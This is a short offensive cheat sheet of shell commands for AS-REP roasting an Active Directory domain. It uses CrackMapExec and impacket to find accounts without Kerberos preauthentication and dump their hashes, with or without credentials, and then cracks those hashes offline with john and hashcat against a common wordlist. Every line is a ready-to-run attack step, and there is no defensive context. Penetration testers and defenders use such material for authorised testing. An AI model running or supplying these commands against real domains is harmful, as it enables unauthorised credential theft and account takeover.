# Find users with DONT_REQ_PREAUTH using CrackMapExec
crackmapexec ldap $DC -u $USER -p $PASS --asreproast output.txt

# Using impacket
impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -format john -outputfile asrep_hashes.txt

# Without credentials (if any users have preauth disabled)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format john -outputfile asrep_hashes.txt

# Crack with john
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt